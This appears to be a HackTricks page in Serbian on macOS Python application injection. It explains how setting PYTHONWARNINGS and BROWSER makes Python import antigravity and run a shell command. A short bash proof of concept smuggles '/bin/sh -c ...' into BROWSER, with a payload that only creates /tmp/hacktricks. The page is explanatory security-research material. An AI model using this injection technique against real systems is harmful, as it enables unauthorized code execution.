# Injekcija Python aplikacija na macOS-u

{{#include ../../../banners/hacktricks-training.md}}

## Putem promenljivih okruženja `PYTHONWARNINGS` i `BROWSER`

Ako napadač može da kontroliše okruženje Python procesa, kombinacija promenljivih `PYTHONWARNINGS` i `BROWSER` može pokrenuti izvršavanje komandi kada Python uveze modul `antigravity` tokom obrade posebno kreirane opcije upozorenja. Ova tehnika se oslanja na to da `antigravity` otvara URL pomoću Python modula `webbrowser`, koji poštuje promenljivu okruženja `BROWSER`.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## References

- [1] [Hakovanje pomoću promenljivih okruženja - elttam](https://www.elttam.com/blog/env/)
{{#include ../../../banners/hacktricks-training.md}}
